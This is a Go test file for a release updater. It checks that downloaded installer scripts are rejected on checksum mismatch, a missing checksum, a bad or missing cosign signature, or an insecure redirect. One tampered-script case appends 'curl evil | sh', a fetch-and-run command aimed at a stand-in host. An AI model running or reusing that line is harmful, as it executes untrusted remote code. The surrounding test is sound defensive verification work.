package update

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

const testScript = "#!/bin/sh\necho installing\n"

// serveRelease serves assets under /v1.2.3/ and points releaseBase at it.
func serveRelease(t *testing.T, assets map[string]string) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, ok := assets[strings.TrimPrefix(r.URL.Path, "/v1.2.3/")]
		if !ok {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(srv.Close)
	orig := releaseBase
	releaseBase = srv.URL
	t.Cleanup(func() { releaseBase = orig })
}

func stubCosign(t *testing.T, path string, err error) {
	t.Helper()
	orig := lookCosign
	lookCosign = func() (string, error) { return path, err }
	t.Cleanup(func() { lookCosign = orig })
}

func sumLine(body, name string) string {
	h := sha256.Sum256([]byte(body))
	return hex.EncodeToString(h[:]) + "  " + name + "\n"
}

func TestFetchInstaller_ChecksumOnly(t *testing.T) {
	stubCosign(t, "", errors.New("not found"))
	serveRelease(t, map[string]string{
		"checksums.txt": sumLine("archive", "fsend_1.2.3_linux_amd64.tar.gz") + sumLine(testScript, "install.sh"),
		"install.sh":    testScript,
	})
	dir := t.TempDir()
	path, signed, err := FetchInstaller(context.Background(), "1.2.3", "install.sh", dir)
	if err != nil {
		t.Fatal(err)
	}
	if signed {
		t.Error("signed = true without cosign")
	}
	if got, _ := os.ReadFile(path); string(got) != testScript || filepath.Dir(path) != dir {
		t.Errorf("wrote %q to %s", got, path)
	}
}

func TestFetchInstaller_Rejects(t *testing.T) {
	stubCosign(t, "", errors.New("not found"))
	for _, tc := range []struct {
		name   string
		assets map[string]string
		want   string
	}{
		{"tampered", map[string]string{
			"checksums.txt": sumLine(testScript, "install.sh"),
			"install.sh":    testScript + "curl evil | sh\n",
		}, "checksum mismatch"},
		{"unlisted", map[string]string{
			"checksums.txt": sumLine("archive", "fsend_1.2.3_linux_amd64.tar.gz"),
			"install.sh":    testScript,
		}, "no checksum for install.sh"},
		{"no checksums", map[string]string{"install.sh": testScript}, "404"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			serveRelease(t, tc.assets)
			_, _, err := FetchInstaller(context.Background(), "v1.2.3", "install.sh", t.TempDir())
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err = %v, want it to mention %q", err, tc.want)
			}
		})
	}
}

// With cosign on PATH the signature gates everything: a failed check or a
// missing bundle aborts instead of falling back to checksum-only.
func TestFetchInstaller_Signature(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("stub cosign is a shell script")
	}
	assets := map[string]string{
		"checksums.txt":               sumLine(testScript, "install.sh"),
		"checksums.txt.sigstore.json": "{}",
		"install.sh":                  testScript,
	}
	stub := func(exit string) string {
		dir := t.TempDir()
		p := filepath.Join(dir, "cosign")
		script := "#!/bin/sh\necho \"$@\" > " + filepath.Join(dir, "args") + "\necho 'error: bad signature' >&2\nexit " + exit + "\n"
		if err := os.WriteFile(p, []byte(script), 0o700); err != nil {
			t.Fatal(err)
		}
		return p
	}

	good := stub("0")
	stubCosign(t, good, nil)
	serveRelease(t, assets)
	if _, signed, err := FetchInstaller(context.Background(), "1.2.3", "install.sh", t.TempDir()); err != nil || !signed {
		t.Fatalf("good signature: signed=%v err=%v", signed, err)
	}
	args, _ := os.ReadFile(filepath.Join(filepath.Dir(good), "args"))
	for _, want := range []string{"verify-blob", "--certificate-identity-regexp " + signerIdentity, "--certificate-oidc-issuer " + signerIssuer} {
		if !strings.Contains(string(args), want) {
			t.Errorf("cosign args %q missing %q", args, want)
		}
	}

	stubCosign(t, stub("1"), nil)
	if _, _, err := FetchInstaller(context.Background(), "1.2.3", "install.sh", t.TempDir()); err == nil || !strings.Contains(err.Error(), "bad signature") {
		t.Fatalf("bad signature: err = %v", err)
	}

	delete(assets, "checksums.txt.sigstore.json")
	stubCosign(t, good, nil)
	serveRelease(t, assets)
	if _, _, err := FetchInstaller(context.Background(), "1.2.3", "install.sh", t.TempDir()); err == nil || !strings.Contains(err.Error(), "signature is unavailable") {
		t.Fatalf("missing bundle: err = %v", err)
	}
}

func TestDownloadClient_RefusesSchemeChange(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://example.invalid/x", http.StatusFound)
	}))
	t.Cleanup(srv.Close)
	orig := releaseBase
	releaseBase = srv.URL
	t.Cleanup(func() { releaseBase = orig })
	if _, err := fetchAsset(context.Background(), "v1.2.3", "install.sh"); err == nil || !strings.Contains(err.Error(), "refusing redirect") {
		t.Fatalf("err = %v, want a refused redirect", err)
	}
}
